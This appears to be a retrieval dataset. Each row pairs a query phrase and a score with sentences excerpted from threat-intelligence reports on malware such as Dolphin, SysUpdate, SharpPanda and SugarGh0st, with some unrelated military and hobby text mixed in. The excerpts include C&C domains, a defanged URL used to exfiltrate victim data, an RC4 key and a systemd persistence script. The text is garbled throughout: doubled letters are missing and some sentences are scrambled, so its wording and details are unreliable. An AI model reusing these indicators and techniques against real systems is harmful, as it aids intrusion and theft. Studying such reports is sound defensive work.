751a00c60e4d6cfbca29fd60f12530fc,Most strings in this version are base64 encoded.,1.0,"['Figure 4.', 'Dolphin evolution timeline November 2021 version 2.0 Version 2.0 introduced the folowing changes to the version found in April 2021: 6/8 Dynamic resolution of suspicious APIs instead of static imports (for example GetAsyncKeyState) aded Shelcode capability finished and improved Persisted shelcode stored in files instead of registry Persisted shelcode loaded and executed on Dolphin startup (previously mising) Portable device file exfiltration capability finished and improved Exfiltration by extensions aded Recognition of internal memory and SD cards (from device ID) aded Comand to get files from portable devices efectively a NOP Device/drive detection and file exfiltration improved Dolphin now unconditionaly creates directory listings and exfiltrates files by extension every 30 minutes for al drives and devices (fixed drives, removable drives, portable devices).', 'Previously, it was just for removable drives; fixed drives were disabled by default and the code used for acesing portable devices was bugy and broken.', 'December 2021 version 2.2 Changes introduced in version 2.2 focused mainly on detection evasion.', 'The credential-stealing capability and comands related to it the credential stealing and Gogle acount comands were removed.', 'Most strings in this version are base64 encoded.', 'January 202 version 3.0 In version 3.0, the code was reorganized and clases renamed, with capabilities remaining unchanged.', 'The base64- encoded strings were plaintext again in this version.', 'We observed the folowing aditional changes: Comand to steal credentials restored in a diferent form; it now executes shelcode from the C&C Comand to get files from portable devices completely removed Comand to get files from drives is now cached/stored in the configuration until completion.', 'If interupted (for example by computer shutdown), it is done on the next run.', 'This is also useful in the case of removable drives that may not be conected when the comand is isued.']"
751a00c60e4d6cfbca29fd60f12530fc,The base64-encoded strings were plaintext again in this version.,1.0000000000000002,"['Previously, it was just for removable drives; fixed drives were disabled by default and the code used for acesing portable devices was bugy and broken.', 'December 2021 version 2.2 Changes introduced in version 2.2 focused mainly on detection evasion.', 'The credential-stealing capability and comands related to it the credential stealing and Gogle acount comands were removed.', 'Most strings in this version are base64 encoded.', 'January 202 version 3.0 In version 3.0, the code was reorganized and clases renamed, with capabilities remaining unchanged.', 'The base64- encoded strings were plaintext again in this version.', 'We observed the folowing aditional changes: Comand to steal credentials restored in a diferent form; it now executes shelcode from the C&C Comand to get files from portable devices completely removed Comand to get files from drives is now cached/stored in the configuration until completion.', 'If interupted (for example by computer shutdown), it is done on the next run.', 'This is also useful in the case of removable drives that may not be conected when the comand is isued.', 'Internet conection check aded (htps:/w.microsoft.com); no malicious code is executed if ofline The diferences betwen versions 2.2 and 3.0, especialy the discrepancy in string encoding, sugest the posibility that the versions were being developed in paralel by diferent people.', 'Conclusion Dolphin is another adition to ScarCrufts extensive arsenal of backdors abusing cloud storage services.']"
e577101e883bfa8804ffff019d2adff3,there was only one stage being decrypted in memory,0.7697851165894388,"['Interestingly, the code related to this DNS C&C comunication is only present in samples that use it, meaning that the builder is modular and that there might be samples in the wild with unreported features.', 'We continue monitoring this group and malware family for updates on posible variations of C&C comunication protocols being abused.', 'In al versions, the malware retrieves information on the infected machine and sends it to the C&C encrypted with DES.', 'Colected machine information includes the folowing: Randomly generated GUID Hostname Domain name Username User privileges Procesor architecture Curent proces ID Operating system version Curent file path 4/9 Local IP adres and port used to send the network packet The configuration is encrypted with a hardcoded DES key and is a few bytes long folowing the structure enumerated below: Table 2.', 'Configuration structure Length (in Field content Coment Example bytes) Header 4 We only found one value 0x01 {89D0E853-FA08- GUID 38 Folows the Microsoft format 4f94-A5FE- A90E6869E074} Size of the C&C section 4 0x018 Size of the next C&C domain 4 0x014 name and port 0x01 = regular C&C C&C type 1 0x05 = DNS tuneling 0x01 0x0 = regular C&C C&C domain name Variable dev.gitlabs.me Port number 4 0x050 Next section contains al the Size of next section 4 hardcoded names (folder, files, 0x034 registry values) Name of the hardcoded directory where files are Variable The folder is located either in % gtdcfp copied Name of the executable Variable TextInputHost.exe vulnerable to side loading Name of the malicious side- Variable rc.dl loaded DL Name of the binary file containing the encoded Variable rc.bin Stage 1 Name of the service or registry key value used for Variable gtdcfp persistence We noted that Stage 2 does not embed the configuration file, which is copied in memory by the previous stage.', 'We only saw one case where there was only one stage being decrypted in memory and the configuration was hardcoded.', 'Interestingly, al the samples of this new version had a domain name as its C&C.', 'In the previous version of SysUpdate, the group used hardcoded IP adreses as C&C.', 'It is posible that this change is a consequence of the new DNS TXT records comunication feature as it requires a domain name.', 'SysUpdate samples for Linux While investigating SysUpdates infrastructure, we found some ELF files linked to some C&C servers.', 'We analyzed them and concluded that the files were a SysUpdate version made for the Linux platform.']"
2102fdb89106081f92ca931caeb5562d,Operating system version,0.8292821236605175,"['After changing the note for a victim, the botmaster requested a list of SMS mesages from a victim with the HTP request POST /stuf .php?mode=showSmsList.', 'The response to this request was a long list of more than 90 SMS mesages from one victim.', 'The SMS mesages are analysed in Section 6.', 'The original HTP response with the SMS list was a JSON fi le using Unicode encoding (\\u chars) for transfering Rusian characters.', 'The folowing is an example: {response: [{conversations: {+90:[{body:\\u0421\\u043f \\u0438\\u041\\u0430\\u043d\\u0438 The decoded text in Rusian is as folows (the pasword was redacted): : Platbox (RUB 120.0); : 342365. .', '.', 'The English translation of this mesage is: Withdrawal of funds: Platbox (RUB 120.0); pasword: 342365.', 'Do not disclose the pasword to ANYONE.', 'Only fraudsters request paswords.', 'This SMS sems to be a mesage from the Platbox Rusian payment system saying that 120 Rusian Rubles have ben withdrawn.', 'Despite our initial asumption that the botnet was only loking for two-factor authentication mesages, it is unclear why the botmasters are monitoring these mesages.']"
2102fdb89106081f92ca931caeb5562d,Operating system version,0.8292821236605175,"['After changing the note for a victim, the botmaster requested a list of SMS mesages from a victim with the HTP request POST /stuf .php?mode=showSmsList.', 'The response to this request was a long list of more than 90 SMS mesages from one victim.', 'The SMS mesages are analysed in Section 6.', 'The original HTP response with the SMS list was a JSON fi le using Unicode encoding (\\u chars) for transfering Rusian characters.', 'The folowing is an example: {response: [{conversations: {+90:[{body:\\u0421\\u043f \\u0438\\u041\\u0430\\u043d\\u0438 The decoded text in Rusian is as folows (the pasword was redacted): : Platbox (RUB 120.0); : 342365. .', '.', 'The English translation of this mesage is: Withdrawal of funds: Platbox (RUB 120.0); pasword: 342365.', 'Do not disclose the pasword to ANYONE.', 'Only fraudsters request paswords.', 'This SMS sems to be a mesage from the Platbox Rusian payment system saying that 120 Rusian Rubles have ben withdrawn.', 'Despite our initial asumption that the botnet was only loking for two-factor authentication mesages, it is unclear why the botmasters are monitoring these mesages.']"
5d9861a26c9cd5bdcb58921a7b6843d1,Operating system version,0.8268911010962539,"['These domains include is to create.', ""In this instance, the configured named bs.afbjz.com', newhose.ntimobile.com', and was winsvcfs.dl, as shown in Figure 2."", ""Due to the w.adv138mail.com'32."", 'namebeing configurable, theRAT wilnot alwaysbe caled winsvcfs.dl.', 'The configuration block also The RAT has many diferent capabilities and contains a calback domain and port for the runs onmultipleversionsoftheMicrosoft Windows malwares comand and control comunications.', 'operating system.', ""The RAT's behaviour changes The calback domain is configured to be slightly depending onwhichversionof theWindows nateon.duamlive.com and the port is configured to operating system it is instaled on and which be80 (50inhexadecimal), also showninFigure2."", 'modules are instaled.', 'Modules used by the RAT deployed to the SK Comunications network If no configuration is specified, the malware include: uses default values instead.', 'The default calback location hardcoded into the malware is the private IP adres, 192.168.0.20.', 'This adres is not 28Theprocesvchost.exe is agenerichostprocesforservices 31 Symantec antivirus software detects nateon.exe as which runfromDLs.']"
5d9861a26c9cd5bdcb58921a7b6843d1,Operating system version,0.8268911010962539,"['These domains include is to create.', ""In this instance, the configured named bs.afbjz.com', newhose.ntimobile.com', and was winsvcfs.dl, as shown in Figure 2."", ""Due to the w.adv138mail.com'32."", 'namebeing configurable, theRAT wilnot alwaysbe caled winsvcfs.dl.', 'The configuration block also The RAT has many diferent capabilities and contains a calback domain and port for the runs onmultipleversionsoftheMicrosoft Windows malwares comand and control comunications.', 'operating system.', ""The RAT's behaviour changes The calback domain is configured to be slightly depending onwhichversionof theWindows nateon.duamlive.com and the port is configured to operating system it is instaled on and which be80 (50inhexadecimal), also showninFigure2."", 'modules are instaled.', 'Modules used by the RAT deployed to the SK Comunications network If no configuration is specified, the malware include: uses default values instead.', 'The default calback location hardcoded into the malware is the private IP adres, 192.168.0.20.', 'This adres is not 28Theprocesvchost.exe is agenerichostprocesforservices 31 Symantec antivirus software detects nateon.exe as which runfromDLs.']"
b78fea03a8dcf06cdf0ff78e1e505ed0,Operating system version,0.8681673498863652,"[']com Al values that are colored in red are now chosen at random from a hard-coded list that is decoded from the stage 2 content (using the Type C XOR algorithm).', 'The encrypted blob (cokie value) is initialy a JSON dictionary, encrypted with the RC4 algorithm (using the key BD DE 96 D2 9C 68 E 06 49 64 D1 E5 8A 86 05 12 B0 9A 50 0 4E F2 E4 92 5C 76 AB FC 90 23 DF C6, decoded from stage 2 content), XORed (using the Type B XOR algorithm), base64- encoded and URL-encoded.', 'The actual JSON content is very similar to the one that is sent by VileDroper to the C2 server: Provided by JSON Key VileDroper via Value the comand line Hard-coded value (65 in the last sample we analyzed) which might be a v version number.', 'u The target identifier.', 'a The list of security solutions instaled on the targeted computer.', 'w The targets operating system version.', 'd A fixed identifier, which might designate a campaign or version.', 'n The targets fuly qualified login (%USERDOMAIN%\\%USERNAME%).', 'r Flag that indicates if the mutex creation suceded (1) or failed (0).', 'xn Curent proces name (e.g., SerenadeDACplAp.exe).', 's Constant value embeded in the code and equal to 0.']"
e577101e883bfa8804ffff019d2adff3,the malware retrieves information on the infected machine and sends it to the C&C encrypted with DES.,0.9278124447763774,"['This is because the random number changes every time, but the end is the same 0x2191 result.', 'This explains why the first DNS request always ends with rea.<c&c domain>.', 'If the C&C reply matches the format expected by the malware, it launches multiple threads that handle further comands and sends information about the infected machine.', 'Interestingly, the code related to this DNS C&C comunication is only present in samples that use it, meaning that the builder is modular and that there might be samples in the wild with unreported features.', 'We continue monitoring this group and malware family for updates on posible variations of C&C comunication protocols being abused.', 'In al versions, the malware retrieves information on the infected machine and sends it to the C&C encrypted with DES.', 'Colected machine information includes the folowing: Randomly generated GUID Hostname Domain name Username User privileges Procesor architecture Curent proces ID Operating system version Curent file path 4/9 Local IP adres and port used to send the network packet The configuration is encrypted with a hardcoded DES key and is a few bytes long folowing the structure enumerated below: Table 2.', 'Configuration structure Length (in Field content Coment Example bytes) Header 4 We only found one value 0x01 {89D0E853-FA08- GUID 38 Folows the Microsoft format 4f94-A5FE- A90E6869E074} Size of the C&C section 4 0x018 Size of the next C&C domain 4 0x014 name and port 0x01 = regular C&C C&C type 1 0x05 = DNS tuneling 0x01 0x0 = regular C&C C&C domain name Variable dev.gitlabs.me Port number 4 0x050 Next section contains al the Size of next section 4 hardcoded names (folder, files, 0x034 registry values) Name of the hardcoded directory where files are Variable The folder is located either in % gtdcfp copied Name of the executable Variable TextInputHost.exe vulnerable to side loading Name of the malicious side- Variable rc.dl loaded DL Name of the binary file containing the encoded Variable rc.bin Stage 1 Name of the service or registry key value used for Variable gtdcfp persistence We noted that Stage 2 does not embed the configuration file, which is copied in memory by the previous stage.', 'We only saw one case where there was only one stage being decrypted in memory and the configuration was hardcoded.', 'Interestingly, al the samples of this new version had a domain name as its C&C.', 'In the previous version of SysUpdate, the group used hardcoded IP adreses as C&C.']"
e577101e883bfa8804ffff019d2adff3,the malware retrieves information on the infected machine and sends it to the C&C,0.766905561446236,"['This is because the random number changes every time, but the end is the same 0x2191 result.', 'This explains why the first DNS request always ends with rea.<c&c domain>.', 'If the C&C reply matches the format expected by the malware, it launches multiple threads that handle further comands and sends information about the infected machine.', 'Interestingly, the code related to this DNS C&C comunication is only present in samples that use it, meaning that the builder is modular and that there might be samples in the wild with unreported features.', 'We continue monitoring this group and malware family for updates on posible variations of C&C comunication protocols being abused.', 'In al versions, the malware retrieves information on the infected machine and sends it to the C&C encrypted with DES.', 'Colected machine information includes the folowing: Randomly generated GUID Hostname Domain name Username User privileges Procesor architecture Curent proces ID Operating system version Curent file path 4/9 Local IP adres and port used to send the network packet The configuration is encrypted with a hardcoded DES key and is a few bytes long folowing the structure enumerated below: Table 2.', 'Configuration structure Length (in Field content Coment Example bytes) Header 4 We only found one value 0x01 {89D0E853-FA08- GUID 38 Folows the Microsoft format 4f94-A5FE- A90E6869E074} Size of the C&C section 4 0x018 Size of the next C&C domain 4 0x014 name and port 0x01 = regular C&C C&C type 1 0x05 = DNS tuneling 0x01 0x0 = regular C&C C&C domain name Variable dev.gitlabs.me Port number 4 0x050 Next section contains al the Size of next section 4 hardcoded names (folder, files, 0x034 registry values) Name of the hardcoded directory where files are Variable The folder is located either in % gtdcfp copied Name of the executable Variable TextInputHost.exe vulnerable to side loading Name of the malicious side- Variable rc.dl loaded DL Name of the binary file containing the encoded Variable rc.bin Stage 1 Name of the service or registry key value used for Variable gtdcfp persistence We noted that Stage 2 does not embed the configuration file, which is copied in memory by the previous stage.', 'We only saw one case where there was only one stage being decrypted in memory and the configuration was hardcoded.', 'Interestingly, al the samples of this new version had a domain name as its C&C.', 'In the previous version of SysUpdate, the group used hardcoded IP adreses as C&C.']"
e577101e883bfa8804ffff019d2adff3,"Then, the malware retrieves information on the compromised computer and sends it to the C&C.",1.0000000000000002,"['It is posible that the developer made use of the Asio library because of its portability acros multiple platforms.', 'Some parameters can be pased to the binary (note that Bolean refers to Bolean data that is sent to the C&C): Table 3.', 'Parameters pased to the binary as observed from Linux SysUpdate samples Parameter Efect -launch Sets persistence, zeroes bolean, and exits -run Zeroes bolean and continues -x Daemonize the proces, zeroes bolean, and continues -i Daemonize the proces, zeroes bolean, sets persistence, and continues -f <guid> Sets the GUID to <guid> and continues The persistence is ensured by copying a script similarly named as the curent filename to the /usr/lib/systemd/system/ directory, and creating a symlink to this file in the /etc/ystem/system/multi- user.target.wants/ directory.', 'Thus, this method only works if the curent proces has rot privileges.', 'The content of the script is: [Unit] Description=x [Service] Type=forking ExecStart=<path to curent file> -x ExecStop=/usr/bin/id [Instal] WantedBy=multi-user.target After runing the code dependent on the parameters, if the operator has not chosen a GUID with the -f parameter, the malware generates a random GUID and writes it to a file similarly named as the curent file, with a d apended to it.', 'Then, the malware retrieves information on the compromised computer and sends it to the C&C.', 'The folowing information is sent to the C&C, encrypted with a hardcoded key and DES CBC algorithm: GUID Host name Username Local IP adres and port used to send the request Curent PID Kernel version and machine architecture Curent file path Bolean (0 if it was launched with exactly one parameter, 1 otherwise) 6/9 For the DNS C&C comunication version, the malware retrieves the configured DNS server by reading the content of the /etc/resolv.conf file, or uses the DNS server operated by Gogle at IP adres 8.8.8.8.', 'In 202, we already noticed that this threat actor was interested in platforms other than Windows, with the rshel malware family runing on Linux and Mac OS.', 'For these reasons, we would not be surprised to se SysUpdate samples for the Mac OS platform in the future.', 'Interestingly, most of the Linux samples we found used the new DNS tuneling feature we detailed in Figure 2, while only one of the Windows samples used it.', 'Certificate compromise Another interesting part of this campaign is the fact that some of the malicious files are signed with a certificate with the folowing signer: Permyakov Ivan Yurievich IP.']"
e577101e883bfa8804ffff019d2adff3,used as a lure to entice the victim into opening the malicious file.,0.809878339178906,"['However, the legitimate files are signed with a Xinda.im certificate instead of the stolen VMProtect certificate.', 'Figure 3.', 'Comparing the properties of the malicious file (left), and properties of the legitimate Youdu instaler (right) As sen in the product name identified in the malicious files properties, we searched for posible products named i Talk but did not find any that could be related to this investigation.', 'However, we found traces of files from the legitimate Youdu chat aplication signed by Xinda.im being copied to folders named i Talk on one victims computer.', 'This sugests that some chat aplication named i Talk might be repackaging components from the oficial Youdu client along with malicious executables.', 'It apears that a chat aplication was used as a lure to entice the victim into opening the malicious file.', 'This would be consistent with the tactics, techniques, and procedures (TPs) of two previous Iron Tiger campaigns from 2020 and 2021: a documented compromise of a chat aplication widely used by the Mongolian government, and a suply chain atack on Mimi chat, a chat aplication used in parts of South East Asia.', 'Post-exploitation tols We found a custom Chrome pasword and cokie graber that apeared unfamiliar, and it was compiled and uploaded in September 202.', 'The file was also signed with the VMProtect certificate but it was not obfuscated.', 'In general, the features were simple; the malware decrypts the saved paswords to a file named paswords.txt, and the cokies to a file named cokies.txt.', 'Analyzing its details, the malware first parses the Local State file to retrieve the AES key used to encrypt the cokies and paswords.']"
3e9312913ace03550c810e6b92ab1d61,whoami,1.0,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,whoami,1.0,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,whoami  /groups,0.8671286062716087,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,whoami  /groups,0.8671286062716087,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
39e29af445d8deae622f11c7366518a7,is a batch script,0.7960015515908552,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16 The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
eca348ac2e9d0da5334464f9c73d2754,is a batch script,0.7960015515908552,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 5/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 6/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
632480edb6127046f909c2df7fa40ee1,"leverages a specific set of vulnerabilities, including CVE-2018-0802, CVE-2018-0798, and CVE-2017-11882, within the Equation Editor of Microsoft Office",0.7939576087366783,"['The atached document in the spam email is shown below.', '3/10 Figure 3 Opened document atachment from spam email Upon opening the document, it initiates the download of a new payload from the atackers remote server (hxp[:]/13[.]236[.]189[.]80:80/res/translate[.', ']res), which is RTF file serving as the next-level payload.', '4/10 Figure 4 Payload URL present inside the XML file of the malicious document The RTF file is weaponized using a tol caled RoyalRoad.', 'This tol enables the TAs to create customized documents containing embeded objects that exploit vulnerabilities in Microsoft Words Equation Editor.', 'RoyalRoad leverages a specific set of vulnerabilities, including CVE-2018-0802, CVE-2018-0798, and CVE-2017- 182, within the Equation Editor of Microsoft Ofice.', 'The TAs integrate anti-analysis and anti-debuging techniques into their loaders to avoid being detected while also utilizing the older Equation Editor exploits.', 'The RTF file includes both an encrypted payload and shelcode.', 'Once the RTF file is executed, it proceds to decrypt and drops an embeded payload, which is a DL file saved under the name c6gt.b in the %temp% directory.', 'After decryption, the shelcode facilitates the establishment of a persistence mechanism.', 'It achieves this by creating a scheduled task entry, which executes the export function StartA from the DL c6gt.b using rundl32.exe on a daily basis.']"
632480edb6127046f909c2df7fa40ee1,employs a forged document linked to G7 to target various governments within the G20 forum.,0.8407649564548288,"['The G20, or Group of Twenty, is an international forum comprising 19 countries and the European Union (EU).', 'Established in 19, its primary objective is to foster global economic coperation and adres key chalenges impacting the worldwide economy.', 'Member countries of the G20 include Argentina, Australia, Brazil, Canada, China, France, Germany, India, Indonesia, Italy, Japan, Mexico, Rusia, Saudi Arabia, South Africa, South Korea, Turkey, the United Kingdom, and the United States.', 'Together, these nations represent a diverse range of economies, constituting a significant share of global GDP and population.', 'The G20 holds anual sumits where leaders convene to discus and cordinate security, economic, and financial policies.', '1/10 In its latest campaign, the SharpPanda APT group employs a forged document linked to G7 to target various governments within the G20 forum.', 'The delivery mechanism of the SharpPanda APT atack via a spam email is ilustrated in the figure below.', 'Figure 1 Infection chain Technical Details Initial Infection The infection proces initiates through a spam email comprising an atached MS Ofice document named [FINAL] Hiroshima Action Statement for Resilient Global Fod Security_trackchanged.docx.', 'These emails, with the subject line [Sending Finalized Text] G7+Partners FAS Meting, are distributed to multiple employes within government entities acros G20 countries, as shown in the figure below.', '2/10 Figure 2 Spam email containing malicious doc atachment The emails contain weaponized versions of semingly genuine oficial documents, which employ the remote template injection method to retrieve the next stage of the malware from the TAs Comand-and-Control (C&C) server.', 'The atached document in the spam email is shown below.']"
632480edb6127046f909c2df7fa40ee1,enables the TAs to create customized documents containing embedded objects that exploit vulnerabilities in Microsoft Word’s Equation Editor,0.8161831810231946,"['2/10 Figure 2 Spam email containing malicious doc atachment The emails contain weaponized versions of semingly genuine oficial documents, which employ the remote template injection method to retrieve the next stage of the malware from the TAs Comand-and-Control (C&C) server.', 'The atached document in the spam email is shown below.', '3/10 Figure 3 Opened document atachment from spam email Upon opening the document, it initiates the download of a new payload from the atackers remote server (hxp[:]/13[.]236[.]189[.]80:80/res/translate[.', ']res), which is RTF file serving as the next-level payload.', '4/10 Figure 4 Payload URL present inside the XML file of the malicious document The RTF file is weaponized using a tol caled RoyalRoad.', 'This tol enables the TAs to create customized documents containing embeded objects that exploit vulnerabilities in Microsoft Words Equation Editor.', 'RoyalRoad leverages a specific set of vulnerabilities, including CVE-2018-0802, CVE-2018-0798, and CVE-2017- 182, within the Equation Editor of Microsoft Ofice.', 'The TAs integrate anti-analysis and anti-debuging techniques into their loaders to avoid being detected while also utilizing the older Equation Editor exploits.', 'The RTF file includes both an encrypted payload and shelcode.', 'Once the RTF file is executed, it proceds to decrypt and drops an embeded payload, which is a DL file saved under the name c6gt.b in the %temp% directory.', 'After decryption, the shelcode facilitates the establishment of a persistence mechanism.']"
632480edb6127046f909c2df7fa40ee1,encrypts the collected information using RC4 encryption with the key “xkYgv127” and encodes it using base64.,0.8082717917183572,"['The figure below ilustrates the presence of embeded content within the RTF document.', '5/10 Figure 5 Embeded payload in RTF file Once the persistence is established, the RTF file proceds to execute the downloaded DL payload by utilizing the rundl32.exe comand as folows: rundl32.exe C:\\Users<Admin>\\ApData\\Local\\Temp\\c6gt.b StartA DL Downloader (c6gt.b) The DL files original name is Downloader.dl.', 'It contains four export functions, as depicted below.', '6/10 Figure 6 Export functions of the DL loader When the loader is executed through rundl32.exe, it colects various data from the victims computer.', 'This includes the hostname, operating system name, OS version, username, Internet information, as wel as the presence of any instaled anti-virus software on the machine.', '7/10 Subsequently, the loader encrypts the colected information using RC4 encryption with the key xkYgv127 and encodes it using base64.', 'The encrypted data is then exfiltrated using the below C&C URL: hxps:/13[.]236[.]189[.]80:801/G0AnyWhere_up[.', ']jsp?Data=[redacted] The figure below ilustrates the exfiltrated data sent to the C&C server, as wel as the decrypted/decoded stolen information obtained from the victims machine.', 'Figure 7 Exfiltrated data to C&C server Final Payload Once the victims information is sent to the remote server, the TA checks the information.', 'If they dem the victims machine to be intriguing, the C&C server responds with the next stage executable.', 'During the final phase of the infection chain, the malicious loader in the SharpPanda APT campaign is specificaly designed to download a backdor module.']"
cae33c8970a53857dff6608fe8894b8a,"scheduled task entry,",0.807873308749515,"['Copyright Leonardo S.p.a. Al rights reserved 2 Company General Use MALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE AT&CK TPs T1059 Comand-Line Comand-line interfaces provide a way of interacting with computer Interface systems and is a comon feature acros many types of operating system platforms.', 'One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often acomplished by the host based firewal, but could also be implemented by custom software.', 'T105 Remote File Files may be copied from one system to another to stage adversary Copy tols or other files over the course of an operation.']"
36d752fcb9b7993e639b7b1deb91e53e,"Internet information,",0.7687893116644354,"['The integrated parts of EIW degrade enemy situational awarenes and understanding, and cause physical and psychological limitations of enemy actions in combat.', 'Se chapter 9 for aditional information on EIW.', '4-34 ATP 7-10.2 24 July 2020 Batle Drils 4-108.', 'Perception management and media manipulation in EIW can be KPA advantages with significant planing and efective deception and misinformation actions.', 'The influence of EIW on the enemy and a relevant population manipulates societal or cultural norms that can shape or misguide behaviors.', 'Densely populated urban areas present EIW oportunities les likely in rural environments due to easier multiple media reporting and aces to social media and the Internet.', '4-109.', 'Urban environment actions incorporate ofensive, defensive, and counterstability mision tasks.', 'Urban considerations include complex manmade physical terain and natural terain, such as waterways and severe topography slopes in elevation or depresion that can transit an urban area.', 'Other urban aspects are demographics of the population, manmade suport systems existing within the urban area in building complexes and surface thoroughfares, and traficability in subsurface or dep subteranean systems.', '4-10.']"
db2f903e977374784f3c3c1683c63625,"Internet information,",0.7687893116644354,"['The Security researchers tweted that A platform used to control delete fi les, or disable services.', 'F5 ACSC performed CHIPs scaning disclosed, researchers published vulnerability was so easy to exploit real world devices are being erased.', 'trafi c that pases through an encouraged users runing at-risk to determine how many Australian exploits, with malicious actors that some security researchers The ACSC received its fi rst reported enterprise network, developed versions to upgrade as son devices were vulnerable, and notifi ed son using them in atacks acros speculated that it did not end up in Australian incidents relating to by US company F5.', 'as posible.', 'government operators.', 'the internet.', 'the products by acident.', 'exploitation of F5.', 'F5 BIG-IP Confl uence What is Confl uence?', '25 August 2021 31 August 2021 1 September 2021 A web-based database tol for Atlasian publicly anounced a A Prof of Concept for the exploit was A CHIPs scan detected malicious team colaboration, developed vulnerability (CVE-202126084) published online; fi rst public reports actors scaning for, and atempting by Australian technology in certain versions of Atlasian of exploitation ocured the to exploit, this vulnerability on company Atlasian.', 'Confl uence and released software same day.']"
475cc557a403e5a686bf4e9a5b16e3d2,"Internet information,",0.8014026788400449,"['If $169 but there are often discounts comunications.', 'I was not lazy, I would create a playlist online.', 'This was a step up from the in Kodi from my digital MP3 colection.', 'introductory $10 Crosley T40.', 'Both Internet Restrictions: This option However, I would usualy throw on have a similar nedle, but the C10 wil not be popular.', 'Every night around SiriusXM, a live radio fed, or another has an adjustable tone arm (to help 9pm, I shut of the internet.', 'Al of it.', 'streaming service.', 'These endles audio preserve my new upcoming record The incoming modem, my firewal, transmisions encouraged me to sit colection) and beter pitch control.', 'and the Wi-Fi.', 'This eliminates any non-stop in front of my computer That was important to me and was posible conection since al celular is while listening to digitaly-compresed mising from other afordable models.']"
31347d89b18461f35448b26fefb00133,"exe└──cmd.exe: C:\Windows\system32\cmd.exe /c """"rdp.bat""",0.805354720058993,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
